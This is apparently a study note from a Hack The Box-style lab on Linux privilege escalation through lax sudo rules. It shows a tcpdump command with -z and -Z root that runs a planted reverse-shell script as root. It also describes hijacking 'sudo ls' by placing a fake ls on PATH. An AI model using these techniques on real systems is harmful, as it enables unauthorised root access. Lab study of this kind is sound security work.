
Sometimes, we are allowed to run some app or script as sudo without password, for example:
```
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

It is worth checking if the allowed app (tcpdump in above example) is one of the GTFObins that we can use for privilege escalation, tcpdump without AppArmor would allow us to provide a script to be executed using the -z parameter, which we can create a reverse shell named .test and can be executed with below syntax:
```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

We can also abuse sudo right if it is granted in a laxed way, take a look at example below:
```
csmith@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User csmith may run the following commands on NIX02:
    (root) NOPASSWD: ls
```

The above permission is granted in a very lax way, combined with the technique to add current directory to PATH mentioned at [[Abusing built-in functionality]], we can create a reverse shell named ls and simply run:

```
sudo ls
```